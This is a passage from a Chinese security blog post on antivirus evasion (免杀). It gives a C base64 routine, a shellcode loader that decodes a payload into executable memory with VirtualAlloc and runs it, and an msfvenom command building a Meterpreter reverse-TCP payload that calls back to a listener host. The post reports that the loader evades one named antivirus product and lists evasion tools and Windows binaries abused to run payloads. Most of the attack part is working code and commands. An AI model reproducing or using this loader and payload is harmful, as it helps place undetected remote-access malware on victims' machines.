class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">253</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">62</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">63</span>,</span><br><span class="line">    <span class="number">52</span>,  <span class="number">53</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">56</span>,  <span class="number">57</span>,  <span class="number">58</span>,  <span class="number">59</span>,  <span class="number">60</span>,  <span class="number">61</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">254</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">2</span>,   <span class="number">3</span>,   <span class="number">4</span>,   <span class="number">5</span>,   <span class="number">6</span>,</span><br><span class="line">    <span class="number">7</span>,   <span class="number">8</span>,   <span class="number">9</span>,  <span class="number">10</span>,  <span class="number">11</span>,  <span class="number">12</span>,  <span class="number">13</span>,  <span class="number">14</span>,  <span class="number">15</span>,  <span class="number">16</span>,  <span class="number">17</span>,  <span class="number">18</span>,</span><br><span class="line">    <span class="number">19</span>,  <span class="number">20</span>,  <span class="number">21</span>,  <span class="number">22</span>,  <span class="number">23</span>,  <span class="number">24</span>,  <span class="number">25</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>,  <span class="number">26</span>,  <span class="number">27</span>,  <span class="number">28</span>,  <span class="number">29</span>,  <span class="number">30</span>,  <span class="number">31</span>,  <span class="number">32</span>,  <span class="number">33</span>,  <span class="number">34</span>,  <span class="number">35</span>,  <span class="number">36</span>,</span><br><span class="line">    <span class="number">37</span>,  <span class="number">38</span>,  <span class="number">39</span>,  <span class="number">40</span>,  <span class="number">41</span>,  <span class="number">42</span>,  <span class="number">43</span>,  <span class="number">44</span>,  <span class="number">45</span>,  <span class="number">46</span>,  <span class="number">47</span>,  <span class="number">48</span>,</span><br><span class="line">    <span class="number">49</span>,  <span class="number">50</span>,  <span class="number">51</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> <span class="title function_">cmove_bits</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> src, <span class="type">unsigned</span> lnum, <span class="type">unsigned</span> rnum)</span> &#123;</span><br><span class="line">    src &lt;&lt;= lnum; <span class="comment">// src = src &lt;&lt; lnum;</span></span><br><span class="line">    src &gt;&gt;= rnum; <span class="comment">// src = src &gt;&gt; rnum;</span></span><br><span class="line">    <span class="keyword">return</span> src;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">base64_encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *indata, <span class="type">int</span> inlen, <span class="type">char</span> *outdata, <span class="type">int</span> *outlen)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>; <span class="comment">// return value</span></span><br><span class="line">    <span class="keyword">if</span> (indata == <span class="literal">NULL</span> || inlen == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> in_len = <span class="number">0</span>; <span class="comment">// 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数</span></span><br><span class="line">    <span class="type">int</span> pad_num = <span class="number">0</span>; <span class="comment">// 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, )</span></span><br><span class="line">    <span class="keyword">if</span> (inlen % <span class="number">3</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        pad_num = <span class="number">3</span> - inlen % <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    in_len = inlen + pad_num; <span class="comment">// 拼接后的长度, 实际编码需要的长度(3的倍数)</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> out_len = in_len * <span class="number">8</span> / <span class="number">6</span>; <span class="comment">// 编码后的长度</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p = outdata; <span class="comment">// 定义指针指向传出data的首地址</span></span><br><span class="line"></span><br><span class="line">                       <span class="comment">//编码, 长度为调整后的长度, 3字节一组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; in_len; i += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="type">int</span> value = *indata &gt;&gt; <span class="number">2</span>; <span class="comment">// 将indata第一个字符向右移动2bit(丢弃2bit)</span></span><br><span class="line">        <span class="type">char</span> c = base64_alphabet[value]; <span class="comment">// 对应base64转换表的字符</span></span><br><span class="line">        *p = c; <span class="comment">// 将对应字符(编码后字符)赋值给outdata第一字节</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//处理最后一组(最后3字节)的数据</span></span><br><span class="line">        <span class="keyword">if</span> (i == inlen + pad_num - <span class="number">3</span> &amp;&amp; pad_num != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pad_num == <span class="number">1</span>) &#123;</span><br><span class="line">                *(p + <span class="number">1</span>) = base64_alphabet[(<span class="type">int</span>)(cmove_bits(*indata, <span class="number">6</span>, <span class="number">2</span>) + cmove_bits(*(indata + <span class="number">1</span>), <span class="number">0</span>, <span class="number">4</span>))];</span><br><span class="line">                *(p + <span class="number">2</span>) = base64_alphabet[(<span class="type">int</span>)cmove_bits(*(indata + <span class="number">1</span>), <span class="number">4</span>, <span class="number">2</span>)];</span><br><span class="line">                *(p + <span class="number">3</span>) = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (pad_num == <span class="number">2</span>) &#123; <span class="comment">// 编码后的数据要补两个 &#x27;=&#x27;</span></span><br><span class="line">                *(p + <span class="number">1</span>) = base64_alphabet[(<span class="type">int</span>)cmove_bits(*indata, <span class="number">6</span>, <span class="number">2</span>)];</span><br><span class="line">                *(p + <span class="number">2</span>) = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">                *(p + <span class="number">3</span>) = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// 处理正常的3字节的数据</span></span><br><span class="line">            *(p + <span class="number">1</span>) = base64_alphabet[cmove_bits(*indata, <span class="number">6</span>, <span class="number">2</span>) + cmove_bits(*(indata + <span class="number">1</span>), <span class="number">0</span>, <span class="number">4</span>)];</span><br><span class="line">            *(p + <span class="number">2</span>) = base64_alphabet[cmove_bits(*(indata + <span class="number">1</span>), <span class="number">4</span>, <span class="number">2</span>) + cmove_bits(*(indata + <span class="number">2</span>), <span class="number">0</span>, <span class="number">6</span>)];</span><br><span class="line">            *(p + <span class="number">3</span>) = base64_alphabet[*(indata + <span class="number">2</span>) &amp; <span class="number">0x3f</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p += <span class="number">4</span>;</span><br><span class="line">        indata += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (outlen != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *outlen = out_len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">base64_decode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *indata, <span class="type">int</span> inlen, <span class="type">char</span> *outdata)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (indata == <span class="literal">NULL</span> || inlen &lt;= <span class="number">0</span> || outdata == <span class="literal">NULL</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (inlen % <span class="number">4</span> != <span class="number">0</span>) &#123; <span class="comment">// 需要解码的数据不是4字节倍数</span></span><br><span class="line">        <span class="keyword">return</span> ret = <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>, x = <span class="number">0</span>, y = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> g = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (indata[x] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 需要解码的数据对应的ASCII值对应base64_suffix_map的值</span></span><br><span class="line">        c = base64_suffix_map[indata[x++]];</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">255</span>) <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">// 对应的值不在转码表中</span></span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">253</span>) <span class="keyword">continue</span>;<span class="comment">// 对应的值是换行或者回车</span></span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">254</span>) &#123; c = <span class="number">0</span>; g--; &#125;<span class="comment">// 对应的值是&#x27;=&#x27;</span></span><br><span class="line">        t = (t &lt;&lt; <span class="number">6</span>) | c; <span class="comment">// 将其依次放入一个int型中占3字节</span></span><br><span class="line">        <span class="keyword">if</span> (++y == <span class="number">4</span>) &#123;</span><br><span class="line">            outdata[i++] = (<span class="type">unsigned</span> <span class="type">char</span>)((t &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="keyword">if</span> (g &gt; <span class="number">1</span>) outdata[i++] = (<span class="type">unsigned</span> <span class="type">char</span>)((t &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="keyword">if</span> (g &gt; <span class="number">2</span>) outdata[i++] = (<span class="type">unsigned</span> <span class="type">char</span>)(t &amp; <span class="number">0xff</span>);</span><br><span class="line">            y = t = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>base64.h</code>文件内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> base64_h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> base64_h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">base64_encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *indata, <span class="type">int</span> inlen, <span class="type">char</span> *outdata, <span class="type">int</span> *outlen)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">base64_decode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *indata, <span class="type">int</span> inlen, <span class="type">char</span> *outdata)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* base64_h */</span></span></span><br></pre></td></tr></table></figure>

<p><code>shellcode.c</code>文件内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;msf base64 code&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str3[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 原po代码报错，这里做了一些强制转换和类型修正</span></span><br><span class="line">    base64_decode(buf, (<span class="type">int</span>)<span class="built_in">strlen</span>(buf), str3);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *Memory;</span><br><span class="line"></span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(str3), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, str3, <span class="keyword">sizeof</span>(str3));</span><br><span class="line"></span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用msf生成base64编码的shellcode：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.174.128 lport=6666  -f c &gt; shell.c</span><br></pre></td></tr></table></figure>

<p>把<code>shell.c</code>的内容复制到上面<code>shellcode.c</code>文件中。vs2019编译，关闭杀软，msf可成功上线。</p>
<p>打开杀软，火绒可以查杀，<strong>360不能查杀</strong>。</p>
<p>virustotal.com上查杀率为17&#x2F;67（原po为28&#x2F;69）。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301558330.png" alt="image-20220530155809229"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>与2020年相比，2022年卷了很多。纵览360和火绒就能直观感受到，确实杀软能力越来越强了。2020年可以Bypass卡巴斯基、McAfee、Symantec等杀软的方法，2022年均失效。</p>
<p>免杀操作层出不穷，特别是近两年也有很多新的优秀项目。本文仅为最基本的免杀方式，前路漫漫，还有很多要学习的，共勉。</p>
<p>一些知识点：</p>
<ul>
<li>常见免杀工具（21种）：msf自免杀、Veil、Venom、Shellter、BackDoor-Factory、Avet、TheFatRat、Avoidz、Green-Hat-Suite、zirikatu、AVIator、DKMC、Unicorn、Python-Rootkit、DKMC、Unicorn、Python-Rootkit、ASWCrypter、nps_payload、GreatSCT、HERCULES、SpookFlare、SharpShooter、CACTUSTORCH、Winpayload等。</li>
<li>常见免杀编程语言：C&#x2F;C++、C#、python、powershell、ruby、go等。</li>
<li>常见免杀白名单程序（113个）：Rundll32.exe、Msiexec.exe、MSBuild.exe、InstallUtil.exe、Mshta.exe、Regsvr32.exe、Cmstp.exe、CScript.exe、WScript.exe、Forfiles.exe、te.exe、Odbcconf.exe、InfDefaultInstall.exe、Diskshadow.exe、PsExec.exe、Msdeploy.exe、Winword.exe、Regasm.exe、Regsvcs.exe、Ftp.exe、pubprn.vbs、winrm.vbs、slmgr.vbs、Xwizard.exe、Compiler.exe、IEExec.exe、MavInject32、Presentationhost.exe、Wmic.exe、Pcalua.exe、Url.dll、zipfldr.dll、Syncappvpublishingserver.vbs等。</li>
</ul>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li>BypassAntiVirus：远控免杀系列文章 <a target="_blank" rel="noopener" href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></li>
<li>AntivirusScanner：杀软进程检测脚本 <a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/AntivirusScanner">https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/AntivirusScanner</a><br></style></li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.smallhao.ddns-ip.net/IMG_6062.jpeg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.smallhao.ddns-ip.net/IMG_6062.jpeg" title="头像" alt="头像"></a><div class="post-copyright__author_name">转载</div><div class="post-copyright__author_desc">SmallHao</div></div><div class="post-copyright__post__info"><a class="post-copyright__reprint" title="该文章为转载文章，注意版权协议" href="http://example.com/smallhao/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80/">转载</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/smallhao/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80/')">内网渗透-免杀</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://img.smallhao.ddns-ip.net/making.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.smallhao.ddns-ip.net/making.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://img.smallhao.ddns-ip.net/zhifubao.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.smallhao.ddns-ip.net/zhifubao.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/smallhao/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=内网渗透-免杀&amp;url=http://example.com/smallhao/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80/&amp;pic=https://img1.baidu.com/it/u=877727430,37580436&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=667" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Small Hao Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%94%BB%E9%98%B2%E7%9F%A5%E8%AF%86/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>攻防知识<span class="tagsPageCount">6</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://img0.baidu.com/it/u=2676346236,2715621986&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=1200&amp;h=800" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/smallhao/%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA-DNSLog/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img1.baidu.com/it/u=2960356299,1327658431&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=1422&amp;h=800" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">平台搭建-DNSLog</div></div></a></div><div class="next-post pull-right"><a href="/smallhao/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img0.baidu.com/it/u=2009713656,733522492&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=1422&amp;h=800" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">MySQL注入技巧</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/smallhao/BurpSuite%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D%EF%BC%88%E4%BA%8C%EF%BC%89/" title="BurpSuite使用介绍（二）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img0.baidu.com/it/u=2676346236,2715621986&fm=253&fmt=auto&app=120&f=JPEG?w=1200&h=800" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-03-22</div><div class="title">BurpSuite使用介绍（二）</div></div></a></div><div><a href="/smallhao/Suite%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D%EF%BC%88%E4%B8%80%EF%BC%89/" title="Burp Suite使用介绍（一）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img0.baidu.com/it/u=2259429094,2069555&fm=253&fmt=auto&app=120&f=JPEG?w=1422&h=800" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-03-20</div><div class="title">Burp Suite使用介绍（一）</div></div></a></div><div><a href="/smallhao/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/" title="MySQL注入技巧"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" 